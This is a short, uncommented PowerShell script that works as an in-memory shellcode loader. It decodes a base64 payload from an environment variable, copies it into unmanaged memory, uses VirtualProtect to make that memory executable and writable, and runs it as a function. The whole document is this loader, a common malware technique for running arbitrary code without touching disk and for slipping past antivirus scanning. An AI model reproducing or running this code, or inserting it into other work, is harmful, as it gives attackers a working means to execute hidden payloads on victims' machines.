$k = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr b, uint c, out uint d);' -Name K -PassThru
$buf = [Convert]::FromBase64String($env:SC)
$p = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $p, $buf.Length)
$old = 0
$k::VirtualProtect($p, [UIntPtr]::new($buf.Length), 0x40, [ref]$old) | Out-Null
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Action])
$f.Invoke()
